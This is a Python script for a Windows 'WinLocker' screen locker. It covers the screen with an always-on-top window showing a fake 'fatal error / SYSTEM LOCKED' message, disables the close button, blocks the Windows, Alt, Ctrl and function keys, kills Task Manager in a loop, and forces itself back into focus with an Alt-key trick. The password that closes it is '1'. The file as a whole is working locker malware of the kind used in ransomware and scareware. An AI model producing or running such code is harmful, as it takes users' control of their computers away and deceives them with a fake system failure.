import tkinter as tk
import threading
import time
import sys
import os
import psutil
import win32gui
import win32con
import win32api
import keyboard

# === SETTINGS ===
UNLOCK_KEY = "1"  # Unlock key
DELAY_BEFORE_INPUT = 1  # Seconds before unlock input shows

# === Main Window ===
root = tk.Tk()
root.attributes("-fullscreen", True)
root.config(bg="black")
root.config(cursor="none")
root.attributes("-topmost", True)
root.title("System Locked")
root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable close button
keyboard.block_key('win')


# Monitor desktop focus and restore the WinLocker window if needed
def monitor_desktop_focus():
    hwnd = root.winfo_id()
    desktop_classes = ["Progman", "WorkerW", "Shell_TrayWnd"]

    while True:
        fg_window = win32gui.GetForegroundWindow()
        class_name = win32gui.GetClassName(fg_window)

        if class_name in desktop_classes:
            try:
                print("[!] Desktop detected. Restoring WinLocker.")
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                win32gui.SetWindowPos(
                    hwnd,
                    win32con.HWND_TOPMOST,
                    0, 0, 0, 0,
                    win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
                )

                # 🪄 ALT trick to bypass SetForegroundWindow protection
                win32api.keybd_event(win32con.VK_MENU, 0, 0, 0)  # Press Alt
                win32gui.SetForegroundWindow(hwnd)
                win32api.keybd_event(win32con.VK_MENU, 0, win32con.KEYEVENTF_KEYUP, 0)  # Release Alt

            except Exception as e:
                print(f"[X] Failed to refocus: {e}")

        time.sleep(0.5)


# Start the desktop focus monitor thread
threading.Thread(target=monitor_desktop_focus, daemon=True).start()

# Monitor and kill Task Manager if it opens
def monitor_and_kill_taskmgr():
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and 'taskmgr.exe' in proc.info['name'].lower():
                    print("[!] Task Manager detected. Terminating it.")
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass  # ignore processes we can't touch
        time.sleep(0.5)

# Start the Task Manager killer in background
threading.Thread(target=monitor_and_kill_taskmgr, daemon=True).start()

# === Message ===
label = tk.Label(root, text="A fatal error has occurred.\nSYSTEM LOCKED",
                 fg="red", bg="black", font=("Courier", 40, "bold"))
label.pack(expand=True)

# === Keyboard Filter ===
def on_key_press(event):
    # Block dangerous keys like Ctrl, Alt, Win, Esc, Tab, F1–F12, etc.
    blocked_keys = (
        "Alt_L", "Alt_R",
        "Control_L", "Control_R",
        "Super_L", "Super_R",  # Windows key (often called "Super")
        "Escape", "Tab", "Caps_Lock",
        "F1", "F2", "F3", "F4", "F5", "F6",
        "F7", "F8", "F9", "F10", "F11", "F12"
    )

    if event.keysym in blocked_keys:
        return "break"  # Prevent the default behavior

# 🔒 Bind globally to intercept all key presses across all widgets
root.bind_all("<KeyPress>", on_key_press)

# === Unlock Input ===
def show_input():
    time.sleep(DELAY_BEFORE_INPUT)
    entry = tk.Entry(root, font=("Courier", 24), justify="center", show="*")
    entry.pack()

    def check_code(event=None):
        if entry.get().strip().lower() == UNLOCK_KEY:
            root.destroy()  # Close WinLocker on correct password
        else:
            entry.config(state="disabled")  # Disable input after wrong password
            time.sleep(2)
            root.quit()  # Gracefully exit if wrong password

    entry.bind("<Return>", check_code)

# Start the unlock input thread
threading.Thread(target=show_input, daemon=True).start()

root.mainloop()
